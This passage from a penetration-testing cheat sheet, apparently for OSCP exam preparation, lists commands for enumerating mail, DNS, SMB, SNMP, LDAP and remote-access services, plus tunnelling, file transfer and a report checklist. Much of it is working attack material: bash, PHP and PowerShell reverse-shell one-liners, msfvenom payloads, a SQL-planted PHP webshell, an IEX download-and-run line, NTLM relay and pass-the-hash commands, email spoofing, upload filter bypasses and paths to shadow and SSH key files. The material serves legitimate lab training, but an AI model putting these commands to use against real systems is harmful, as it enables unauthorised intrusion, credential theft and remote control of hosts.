sudo nmap -p 25,587 --script smtp-* target.com
```

##### smtp-user-enum

``` sh
# SMTP user enumeration via VRFY, EXPN and RCPT with clever timeout, retry and reconnect functional
smtp-user-enum -U /usr/share/wordlists/metasploit/unix_users.txt -M VRFY -t IP
smtp-user-enum -U /usr/share/wordlists/metasploit/unix_users.txt -M RCPT -t IP
smtp-user-enum -U /usr/share/wordlists/metasploit/unix_users.txt -M EXPN -t IP
```

##### Swaks

```sh
# Basic SMTP connectivity test
swaks --to user@target.com --server target.com

# Specify SMTP port
swaks --to user@target.com --server target.com --port 25
swaks --to user@target.com --server target.com --port 587
swaks --to user@target.com --server target.com --port 465 --tls-on-connect

# Enumerate users via RCPT TO
swaks --to test@target.com --server target.com --quit-after RCPT

# Manual MAIL FROM / RCPT TO control
swaks --server target.com --mail-from attacker@evil.com --to victim@target.com

# Test SMTP AUTH (LOGIN)
swaks --to user@target.com --server target.com --auth LOGIN --auth-user user --auth-password pass

# Test SMTP AUTH (PLAIN)
swaks --to user@target.com --server target.com --auth PLAIN --auth-user user --auth-password pass

# Spoof sender address
swaks --to victim@target.com --from ceo@target.com --server target.com

# Custom email body
swaks --to victim@target.com --from attacker@evil.com --server target.com --data "Subject: Test\n\nBody text"

# Attach local file (also try with @ in front of filename)
swaks --to victim@target.com --server target.com --attach file.txt
swaks --to victim@target.com --server target.com --attach @file.txt

# Suppress data send (banner / capability recon)
swaks --server target.com --quit-after EHLO

# Test open relay
swaks --to victim@external.com --from spoof@external.com --server target.com

# Timeout control (avoid hanging)
swaks --to user@target.com --server target.com --timeout 5

```

#### WHOIS (TCP: 43)

```sh
whois DOMAIN
whois IP
```

#### DNS (TCP: 53)

##### Lookup

```sh
# Linux
host DOMAIN
host -t txt DOMAIN
# Windows
nslookup DOMAIN
nslookup -type=TXT DOMAIN IP
```

##### Zone transfer

```sh
# Attempt a Zone Transfer manually 
host -l DOMAIN ns1.DOMAIN
# Automated Zone Transfer check with DNSRecon
dnsrecon -d DOMAIN -t axfr
# Find SRV records (often points to AD Domain Controllers/SIP/LDAP)
host -t SRV _ldap._tcp.DOMAIN
```

#### HTTP(S) (TCP: 80, 443)

##### Enumeration

```sh
http://domain/robots.txt
http://domain/sitemap.xml
CTRL+U (page source)
Wappalyzer
DevTools Debugger
```

##### Interaction with CLI clients

Different methods to connect to HTTP(S) services via CLI.

```sh
curl --path-as-is -vv -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'
curl --data-urlencode
wget
httpx <URL> --download file.txt
```

##### Directories

###### Gobuster

```sh
gobuster dir -u IP -w /usr/share/wordlists/dirb/small.txt -t 10
```

###### Feroxbuster

```sh
feroxbuster -u http://target.com

# Scan with custom wordlist and extensions (PHP/ASP/JS common for OSCP)
feroxbuster -u http://target.com -w wordlist.txt -x php,asp,aspx,js,txt,pdf
```

###### FFUF

``` sh
ffuf -recursion -c -e '.htm','.php','.html','.js','.txt','.zip','.bak','.asp','.aspx','.xml' -w SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://domain.com/FUZZ
```

##### Subdomains

###### Manual

```sh
# Look for subdomains using wordlist
for ip in $(cat list.txt); do host $ip.DOMAIN; done
# Look for subdomains using PTR records (reverse DNS)
for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found"
```

###### DNSRecon

```sh
# Standard scan
dnsrecon -d DOMAIN -t std
# Brute force with wordlist
dnsrecon -d DOMAIN -D ~/list.txt -t brt
```

###### DNSEnum

```sh
dnsenum DOMAIN
```

###### Gobuster

Can create tailored wordlist using LLM or use SecLists.

```sh
gobuster dns -d DOMAIN -w wordlist.txt -t 10
```

###### CRT.sh

[crt.sh](https://crt.sh)

#### SMB (TCP: 139, 445)

##### PowerShell

```sh
net view \\dc01 /all
```

##### Nmap

```sh
# SMB + NetBIOS
sudo nmap -v -p 139,445 IP
sudo nmap -v -p 139,445 --script smb-os-discovery IP
# Enumeration scripts
sudo nmap -p 445 --script=smb-enum-shares,smb-enum-users,smb-enum-groups,smb-enum-domains,smb-security-mode IP

```

##### nbtscan

Query the NetBIOS name service for valid NetBIOS names, specifying the originating UDP port as 137 with the -r option. NetBIOS names are often very descriptive about the role of the host within the organization.

```sh
sudo nbtscan -r IP/24
```

##### enum4linux

https://hackviser.com/tactics/tools/enum4linux

```sh
enum4linux -a IP
```

##### rpcclient

````sh
# Null session
rpcclient -U "" -N IP

# Enumerate users / groups
rpcclient -U "" -N IP -c "enumdomusers"
rpcclient -U "" -N IP -c "enumdomgroups"
rpcclient -U "" -N IP -c "queryuser USERNAME"
````

##### smbmap

```sh
# Enumerate shares
smbmap -H IP
```

##### netexec

```sh
# Validate if credentials work
nxc smb IP -u 'USER' -p 'PASSSWORD'
# Authenticate as domain user
nxc smb IP -u 'USER' -p 'PASS' -d DOMAIN
# Enumerate SMB shares
nxc smb IP -u 'USER' -p 'PASS' --shares
# Enumerate domain users
nxc smb IP -u 'USER' -p 'PASS' --users
# Enumerate domain groups
nxc smb IP -u 'USER' -p 'PASS' --groups
# Enumerate domain computers
nxc smb IP -u 'USER' -p 'PASS' --computers
# Enumerate logged-on users
nxc smb IP -u 'USER' -p 'PASS' --loggedon-users
# Enumerate sessions
nxc smb IP -u 'USER' -p 'PASS' --sessions
# Password policy
nxc smb IP -u 'USER' -p 'PASS' --pass-pol
# RID enumeration
nxc smb IP -u 'USER' -p 'PASS' --rid-brute
# Local users
nxc smb IP -u 'USER' -p 'PASS' --local-users
# Local groups
nxc smb IP -u 'USER' -p 'PASS' --local-groups

# SMB file/share enumeration
# Once --shares identifies interesting shares:
nxc smb IP -u 'USER' -p 'PASS' -M spider_plus
# Target a specific share:
nxc smb IP -u 'USER' -p 'PASS' -M spider_plus -o READ_ONLY=false
# Check whether the credential has administrative access:
nxc smb IP -u 'USER' -p 'PASS'
# Against a subnet containing other Windows hosts:
nxc smb IP/24 -u 'USER' -p 'PASS'
```

##### CrackMmapExec

``` sh
# Check list of users against a single password
crackmapexec smb IP -u users.txt -p 'PASS!' -d DOMAIN.com --continue-on-success
```

##### smbclient

```sh
# List available SMB shares anonymously
smbclient -L 10.0.0.5 -N

# List shares with credentials
smbclient -L 10.0.0.5 -U user%password

# Connect to a share anonymously
smbclient //10.0.0.5/public -N

# Connect to a share with credentials
smbclient //10.0.0.5/share -U user%password

# Connect using a domain-qualified user
smbclient //10.0.0.5/share -U DOMAIN\\user%password

# Specify SMB version (common in CTFs)
smbclient //10.0.0.5/share -U user%password -m SMB2

# Non-interactive directory listing
smbclient //10.0.0.5/share -U user%password -c "ls"

# Download a single file
smbclient //10.0.0.5/share -U user%password -c "get flag.txt"

# Recursively download all files
smbclient //10.0.0.5/share -U user%password -c "recurse; prompt off; mget *"

# Upload a file
smbclient //10.0.0.5/share -U user%password -c "put shell.php"

# Check write permissions quickly
smbclient //10.0.0.5/share -U user%password -c "mkdir testdir"

# Use a credentials file
smbclient //10.0.0.5/share -A creds.txt

# Null session check against IPC$
smbclient //10.0.0.5/IPC$ -N

# Pass NTLM hash
smbclient \\\\192.168.50.212\\secrets -U USER --pw-nt-hash HASH

# Download all files in SMB share
mask ""
recurse ON
prompt OFF
mget *
```

##### Impacket

```sh
# Obtain interactive shell via SMB share using PsExec by passing hash (system privs) 
impacket-psexec -hashes 00000000000000000000000000000000:HASH USER@IP

# Obtain interactive shell via SMB share using WmiExec by passing hash (administrator privs)
impacket-wmiexec -hashes 00000000000000000000000000000000:HASH USER@IP

# Relay Net-NTLMv2 hash (no HTTP server, support SMB2), replace PS base64 content, open listener for reverse shell
impacket-ntlmrelayx --no-http-server -smb2support -t IP -c "powershell -enc PS_REVSHELL_ONELINER_BASE64"
nc -nvlp 8080
# Open bind shell and run SMB connection to Kali (example)
nc IP PORT
dir \\KALI_IP\test
```

##### Responder

[https://github.com/lgandx/Responder](https://github.com/lgandx/Responder)

```sh
# Receive and crack Net-NTLMv2 hash from target using Responder
# Display adapters
ip a
# Run Responder on adapter
sudo responder -I tun0 -wv
# From target machine, run simple dir listing to Responder
# If you have SSRF on a DC, also try to make request to host
dir \\IP\test
# Crack captured Net-NTLMv2 hash with hashcat
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
```

#### SNMP (UDP: 161)

##### Nmap

```sh
# Scan for open ports
sudo nmap -sU --open -p IP -oG open-snmp.txt
```

##### onesixtyone

SNMP brute force scanner.

```sh
echo public > community
echo private >> community
echo manager >> community
for ip in $(seq 1 254); do echo 192.168.0.$ip; done > ips
onesixtyone -c community -i ips
```

##### snmpwalk

```sh
# With hex decode, timeout 10 sec
snmpwalk -c public -v1 -t 10 IP -Oa

# Enumerate Windows users on dc
snmpwalk -c public -v1 IP 1.3.6.1.4.1.77.1.2.25

# Enumerate running processes
snmpwalk -c public -v1 IP 1.3.6.1.2.1.25.4.2.1.2
sudo nmap -sU -p 161 --script=snmp-processes <target>

# Enumerate installed software
snmpwalk -c public -v1 IP 1.3.6.1.2.1.25.6.3.1.2

# Enumerate TCP listening ports
snmpwalk -c public -v1 IP 1.3.6.1.2.1.6.13.1.3
```

#### LDAP (TCP: 389/636)

##### Nmap

```sh
nmap -n -sV --script "ldap* and not brute" IP
```

##### ldapsearch

```sh
ldapsearch -H ldap://IP -x -b "DC=DOMAINPREFIX,DC=DOMAINSUFFIX" 
```

##### ldapdomaindump

```sh
ldapdomaindump IP -u 'DOMAIN\USER' -p 'PASSWORD'
```

##### netexec

``` sh
# Basic LDAP authentication
nxc ldap IP -u 'USER' -p 'PASS'
# Specify domain
nxc ldap IP -u 'USER' -p 'PASS' -d DOMAIN
# Enumerate users
nxc ldap IP -u 'USER' -p 'PASS' --users
# Enumerate groups
nxc ldap IP -u 'USER' -p 'PASS' --groups
# Enumerate computers
nxc ldap IP -u 'USER' -p 'PASS' --computers
# Useful AD security-property enumeration:
# Accounts with "password not required"
nxc ldap IP -u 'USER' -p 'PASS' --password-not-required
# Accounts with adminCount
nxc ldap IP -u 'USER' -p 'PASS' --admin-count
# Computers/users associated with delegation
nxc ldap IP -u 'USER' -p 'PASS' --trusted-for-delegation
# Kerberos-related enumeration:
# AS-REP roastable accounts
nxc ldap IP -u 'USER' -p 'PASS' --asreproast asrep.txt
# Kerberoastable accounts
nxc ldap IP -u 'USER' -p 'PASS' --kerberoasting kerberoast.txt
# BloodHound collection, where supported by your installed NetExec version:
nxc ldap IP -u 'USER' -p 'PASS' --bloodhound -c All
# Read LAPS password
nxc ldap IP -u 'USER' -p 'PASSWORD' -M laps
```

#### Squid Proxy (TCP: 3128)

##### Services

``` sh
# Find open ports on proxy itself
# Spose
python spose.py --proxy http://IP:3128 --target IP -allports
# Nmap (results not always consistent with other tools)
nmap -Pn -sV -p 3128 --script http-open-proxy IP
# When connecting to service, don't use localhost, use 127.0.0.1
```

##### Proxying

``` sh
# In browser, use FoxyProxy
# In CLI, use Proxychains and/or curl
curl --proxy http://IP:3128 http://IP:PORT
proxychains TOOL_WITH_PARAMETERS
```

#### RDP (TCP: 3389)

##### netexec

``` sh
# Check RDP authentication
nxc rdp IP -u 'USER' -p 'PASS'
# Check multiple hosts
nxc rdp IP/24 -u 'USER' -p 'PASS'
# Useful RDP information, depending on NetExec version:
nxc rdp IP -u 'USER' -p 'PASS' --nla
```

##### Connect

``` sh
# xfreerdp3
xfreerdp3 /u:USER/p:PASS /v:IP /dynamic-resolution
# rdesktop (no auth needed)
rdesktop IP
```

#### WinRM (TCP: 5985/5986)

##### Evil-WinRM

```sh
# Remote login
evil-winrm -i IP -u 'USER' -p 'PASSWORD' 
# Remote login with hash
evil-winrm -i IP -u 'USER' -H 'NTHASH'
```

##### netexec

``` sh
# Check whether the credential can authenticate to WinRM:
nxc winrm IP -u 'USER' -p 'PASS'
# Check an entire subnet:
nxc winrm IP/24 -u 'USER' -p 'PASS'
# Test multiple usernames:
nxc winrm IP -u users.txt -p 'PASS'
# Test a password against multiple users:
nxc winrm IP -u users.txt -p 'PASS'
```

##### winrs

``` sh
# From domain joined system
# For WinRS to work, the domain user needs to be part of the Administrators or Remote Management Users group on the target host
winrs -r:HOST -u:USER -p:PASS  "cmd /c hostname & whoami"
```

##### PowerShell

``` sh
# From domain joined system
$username = 'USER';
$password = 'PASS';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName IP -Credential $credential
Enter-PSSession 1
```

#### Databases

##### MSSQL (TCP: 1433)

```sh
# MSSQL login
impacket-mssqlclient USER:PASS@IP -windows-auth

# Check version
SELECT @@version;
# List DBs. Defaults are: master, tempdb, model, and msdb
SELECT name FROM sys.databases;
# List tables in DB
SELECT * FROM offsec.information_schema.tables;
```

##### MySQL (TCP: 3306)

```sh
# MySQL login
mysql -u USER -p'PASS' -h IP -P PORT --skip-ssl-verify-server-cert

# Check version
select version();
# Current user
select system_user();
# List DBs
show databases;
# List tables in DB
show tables from DBNAME;
```

##### PostgreSQL (TCP: 5432)

```sh
# PostgreSQL login
psql -h IP -p PORT -U USER

# List DBs
\l
# Connect to DB
\c DB_NAME
# List tables in DB
select * from DB_NAME;
```


### Web and Reverse Shells

[https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary)
[Linux and Windows PHP shell](https://github.com/ivan-sincek/php-reverse-shell/)

[https://www.revshells.com/](https://www.revshells.com/)

```sh
# Check current shell
ps -p $$
echo %COMSPEC%

# Kali directory webshells
/usr/share/webshells/

# Create webshell using SQL (e.g. in phpmyadmin)
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\<FOLDERPATH>\\shell.php"

# Bash
bash -i >& /dev/tcp/IP/PORT 0>&1
# Bash (URL encoded)
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
# Bash, in case of sh
bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"
# PHP
php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh <&3 >&3 2>&3");'
# Powershell one liner
# https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3 
# in base of Base64, make sure to encode as UTF16 first
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# Python file hosting
python3 -m http.server 80

# Create payloads with msfvenom
# .exe 64-bit, stageless
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > reverse.exe
# .exe 32-bit, stageless
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > reverse.exe
# .elf, stageless
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf -o shell
# PHP
msfvenom -p php/meterpreter/reverse_tcp -f raw LHOST=IP LPORT=PORT > pwn.php
# JSP/WAR, ASP stageless
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war

# File upload extension bypass common attempts
shell.php.jpg
shell.pHp
shell.php%00.jpg
shell.phtml / shell.phar / shell.php5
shell.php.....
```

#### Listeners

``` sh
# Netcat listener
nc -nvlp PORT

# Meterpreter listener
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST IP;set LPORT PORT;run;"
# Meterpreter listener (stageless)
msfconsole -x "use exploit/multi/handler;set payload windows/shell_reverse_tcp;set LHOST IP;set LPORT PORT;run;"   

# Powercat listener script (Kali) and command to execute
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
IEX (New-Object System.Net.Webclient).DownloadString("http://IP/powercat.ps1");powercat -c IP -p PORT -e powershell 

# Penelope
# https://github.com/brightio/penelope
penelope -p 4444
```

#### Upgrade shell

``` sh
# Upgrade shell with Python
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Fix on local side to make proper TTY
Ctrl + Z
stty raw -echo; fg
Enter
```

### Tunneling

#### Ligolo-NG

https://github.com/nicocha30/ligolo-ng/releases/
https://www.tejasl.com/blog/2026/03/03/ligolo-ng-cheatsheet/

``` sh
# Install
# Get agent and proxy
# https://github.com/nicocha30/ligolo-ng/releases/
tar -xzf *.tar.gz
chmod +x proxy
# Create interface 
interface_create --name "ligolo"

# Transfer to target
python3 -m http.server 80
iwr -uri http://192.168.45.152/agent.exe -UseBasicParsing -Outfile agent.exe

# Start interface and proxy
sudo ip link set ligolo up
sudo ./proxy -selfcert
# Start agent
.\agent.exe --connect IP:11601 -ignore-cert
# Establish tunnel by adding route
session
ifconfig
interface_add_route --name ligolo --route FROM_IFCONFIG  
start

# Get localhost access
# Make use of special route
interface_add_route --name ligolo --route 240.0.0.1/32 
route_list
curl 240.0.0.1 

# Webui credentials
ligolo:password:http://127.0.0.1:8080
```

#### Chisel

``` sh
# On host
chmod a+x chisel
./chisel server -p 8080 --reverse
# On target
# Move chisel.exe
chisel.exe client HOST_IP:8080 R:LOCALPORT:REMOTE_HOST:REMOTEPORT
```

#### SSH

##### Linux

``` sh
# Setup an SSH connection from victim1 to victim2, to reach victim3
# Run on victim1
# It will listen on port 4455 on all interfaces on victim1 and redirect to victim2
# On victim2, it will point all network traffic to victim3
# Flag -L: [LOCAL_IP:]LOCAL_PORT:DEST_IP:DEST_PORT
# Flag -N: don't open shell
# Flag -v: use if getting errors for verbose output
ssh -N -L 0.0.0.0:4455:victim3_IP:victim3_PORT victim2_USER@victim2_IP

# SSH dynamic port forwarding
# Use dynamic port forwarding to be able to reach any port on victim3
# However, since this uses SOCKS protocol, we need to talk in SOCKS traffic
ssh -N -D 0.0.0.0:9999 victim2_USER@victim2_IP
# You can use Proxychains to force traffic to SOCKS; alter the config
nano /etc/proxychains4.conf
socks5 victim1_IP 9999
# Run command with Proxychains to hook into it (must be dynamically linked); examples
proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
sudo proxychains nmap -vvv -sT --top-ports=20 -Pn TARGET_IP

# SSH remote port forwarding
# Like reverse shell for port forwarding, use outbound connection from victim1
# Will connect to Kali host from victim1 and build the pipeline via the kali lookback interface
# May have to allow password-based auth by setting PasswordAuthentication to yes in /etc/ssh/sshd_config
sudo systemctl start ssh
ssh -N -R 127.0.0.1:2345:victim2_IP:victim2_PORT kali@LOCAL_IP

# SSH remote dynamic port forwarding
# SSH client version must be >=7.6
ssh -N -R 9998 kali@LOCAL_IP
# You can use Proxychains to force traffic to SOCKS; alter the config
nano /etc/proxychains4.conf
socks5 127.0.0.1 9998
# Examples
sudo proxychains nmap -vvv -sT --top-ports=20 -Pn TARGET_IP

# Using sshutle
# Requires root privileges on the SSH client and Python3 on the SSH server
# Setup Socat port forward on victim1
socat TCP-LISTEN:2222,fork TCP:TARGET_IP:TARGET_PORT
# Setup sshuttle to forward any request to SUBNET_X via victim1
sshuttle -r USER@victim1_IP:2222 SUBNET_1 SUBNET_2 ...
# Example
smbclient -L //SUBNET_2_IP/ -U hr_admin --password=Welcome1234
```

##### Windows

``` sh
# Works the same as Linux, example: remote dynamic port forward
# Start SSH server on Kali
sudo systemctl start ssh
# Connect to Windows victim1 machine via RDP
xfreerdp /u:USER /p:PASSWORD /v:victim1_IP
# Find SSH on Windows host
where ssh
# Check if client version is >=7.6
ssh.exe -V
# Setup remote SSH tunnel with dynamic port forward
ssh -N -R 9998 kali@LOCAL_IP
# Adjust Proxychains config
nano /etc/proxychains4.conf
socks5 127.0.0.1 9998
# Example
proxychains psql -h victim2_IP -U postgres

# Plink 
# When SSH client is not available on victim but tools like PuTTy and Plink (cli) are
# Lacks support for remote dynamic port forwarding and may expose credentials if passwords are passed on cli.
# Find Plink binary on Kali
find / -name plink.exe 2>/dev/null
# Copy for transfer and start webserver
sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
sudo systemctl start apache2
# Download binary on Windows victim1
powershell wget -Uri http://LOCAL_IP/plink.exe -OutFile C:\Windows\Temp\plink.exe
# Setup remote SSH port forwarding from victim1 that only has port 80 exposed, to get RDP into port 3389 via loopback
C:\Windows\Temp\plink.exe -ssh -l kali -pw PASSWORD -R 127.0.0.1:9833:127.0.0.1:3389 LOCAL_IP
# In case of very limited prompt that doesn't accept input
cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l kali -pw PASSWORD -R 127.0.0.1:9833:127.0.0.1:victim1_PORT LOCAL_IP
# Get RDP on victim1 from Kali (Kali ->(loopback) victim1:80 ->(loopback) victim1:3389
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833

# Netsh
# Requires admin privs on Windows
# Run on Windows victim1
netsh interface portproxy add v4tov4 listenport=victim1_PORT listenaddress=victim1_IP connectport=victim2_PORT connectaddress=victim2_IP
# Validate
netsh interface portproxy show all
# Delete port forward
netsh interface portproxy del v4tov4 listenport=victim1_PORT listenaddress=victim1_IP
# When needed, open port victim1_PORT on victim1 with firewall rule
netsh advfirewall firewall add rule name="NAME" protocol=TCP dir=in localip=victim1_IP localport=victim1_PORT action=allow
# Delete firewall rule
netsh advfirewall firewall delete rule name="NAME"
```

### Misc.

```sh
# Last minute tips
# https://hackwithmike.com/oscp/tips

# Folders/files to look in
/var/www/html/ 
/etc/passwd
/etc/shadow
/proc/self/environ
/var/www/html/webdav/passwd.dav

# SSH key handling
../.ssh/id_rsa
chmod 400 id_rsa
sudo -l



# Directory traversal / local file inclusion Windows
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal
C:\Windows\System32\drivers\etc\hosts
# IIS web server files/folders
C:\inetpub\logs\LogFiles\W3SVC1\
C:\inetpub\wwwroot\web.config
# XAMPP PHP
C:\xampp\apache\logs
# SSH
C:\Users\USER\.ssh\id_rsa

# Decode Base64
echo <base64> | base64 -d
# Inspect file in binary
xxd -b malware.txt

# Test whether running in CMD or PS
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
# Escaping for formatting
`

# Exiftool, display duplicated and unknown tags
exiftool -a -u document.pdf

# Quickly scan files for content
find . -type f -name "FILENAME_HINT" -exec grep -niH "TERM" {} +

# Python2 env
sudo apt install virtualenv python2 python2-dev
curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py
sudo python2 get-pip.py  
pip2 install virtualenv      
python2 -m virtualenv py2env  
source py2env/bin/activate
python -V
# Install impacket for Pyhon2
pip install impacket==0.9.22
# Python3 env
python3 -m virtualenv py3env  
source py3env/bin/activate

# Open webdav folder, for example to host malicious .lnk file
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav

# Proxy Python through Burp
# https://www.th3r3p0.com/random/python-requests-and-burp-suite.html
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.get("https://www.google.com/", proxies=proxies, verify=False)

# Small sample files for uploads
https://github.com/mathiasbynens/small

# File upload, collect file elsewhere (UNC path) by changing filename in Burp, e.g. to capture stuff in Responder
\\\\IP\\test

# Wordpress
# https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/wordpress.html
wpscan --url http://IP -v  
# Replace admin password in database
mysql -u USER --password=PASS -h localhost -e "use wp;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"

# Impacket
# Change password
impacket-changepasswd USER@DOMAIN -newpass 'NEWPASSWORD'
# Setup SMB share on host and copy to it from target
mkdir -p ~/transfer
impacket-smbserver transfer ~/transfer -smb2support
copy FILE \\IP\transfer\
```

#### Windows File Upload Methods

Various ways to upload files to a Windows host.

``` sh
# Identify tools available
where curl
where wget
where certutil
where bitsadmin
where powershell
where python
where ftp

# Writable directory candidates
C:\Temp
C:\Windows\Temp
C:\ProgramData
C:\Users\Public
%APPDATA%
# Check write access
echo test > C:\Temp\test.txt

# HTTP
# Server
python3 -m http.server 80
# Client (PowerShell)
iwr http://IP/file.exe -OutFile C:\Temp\file.exe

# certutil (cmd only, no PS)
certutil -urlcache -split -f http://IP/file.exe C:\Temp\file.exe

# Curl (Win 10 1803+)
curl http://IP/file.exe -o C:\Temp\file.exe

# Bitsadmin
bitsadmin /transfer job http://IP/file.exe C:\Temp\file.exe

# FTP
ftp IP
put FILE

# SMB
# Server
impacket-smbserver share $(pwd) -smb2support
# Client
copy \\IP\share\file.exe C:\Temp\file.exe
# or map
net use Z: \\IP\share
Z:\file.exe
```

#### OSCP Exam Report Checklist (per box)

Required per target machine — missing any of these items risks point deductions.

##### Reconnaissance

- [ ] Full nmap scan command and output (all ports, not just top ports)
- [ ] Service enumeration output (versions, banners)
- [ ] Any web directory/subdomain enumeration performed, with tool + wordlist used

##### Initial Access / Foothold

- [ ] Vulnerability identified, with CVE/reference if applicable
- [ ] Exact exploit command or payload used (full syntax, not paraphrased)
- [ ] Proof of the exploit working (screenshot or terminal output showing shell/access gained)
- [ ] Local/proof.txt flag retrieved and its contents shown

##### Privilege Escalation

- [ ] Enumeration steps taken (manual commands and/or LinPEAS/WinPEAS output referenced)
- [ ] Exact vulnerability/misconfiguration exploited for privesc
- [ ] Exact command(s) used to escalate privileges
- [ ] Proof of elevated privileges (id/whoami showing root or SYSTEM)
- [ ] Proof.txt (root/system flag) retrieved and its contents shown

##### Screenshots (mandatory)

- [ ] Command executed AND its output visible in same screenshot
- [ ] Shell prompt showing target IP/hostname visible (to prove correct host)
- [ ] Both local.txt and proof.txt contents shown clearly, uncropped
- [ ] Full command line visible, not truncated

##### Supporting Documentation

- [ ] All commands listed in chronological, reproducible order
- [ ] Any custom scripts/exploits used, included as appendix or inline with explanation
- [ ] Explanation of why each vulnerability exists (root cause, not just "ran exploit")
- [ ] Any pivoting/tunneling steps fully documented if used to reach the box

##### Active Directory Specific (if applicable)

- [ ] Domain enumeration output (users, groups, computers)
- [ ] Attack path explained (e.g. Kerberoasting → cracked hash → lateral movement)
- [ ] Each hop/box in the chain documented with its own proof
- [ ] Domain Admin or equivalent compromise proof, if achieved

##### Final Check Before Submission

- [ ] Every flag (local.txt + proof.txt) for every box pasted into report, exactly as retrieved
- [ ] IP addresses consistent and correct throughout
- [ ] No missing steps between initial scan and final proof (a stranger could reproduce it)

### Kali Setup

Python2 virtual environment

.txt file to copy often needed commands from

Cross compilation mingw-w64 wine 

\+ sudo dpkg --add-architecture i386 && apt-get update &&  
apt-get install wine32

Default CTF folder structure

Bookmarks

[https://explainshell.com/](https://explainshell.com/)

Trillium

VScode

Other resources

Macro/alias for 192.168.

Flameshot

Download seclists

Burp plugin and cert

Copy /usr/share/shells to Downloads for easy access and backup

```sh
cd /usr/share/wordlists/
sudo gzip -d rockyou.txt.gz
```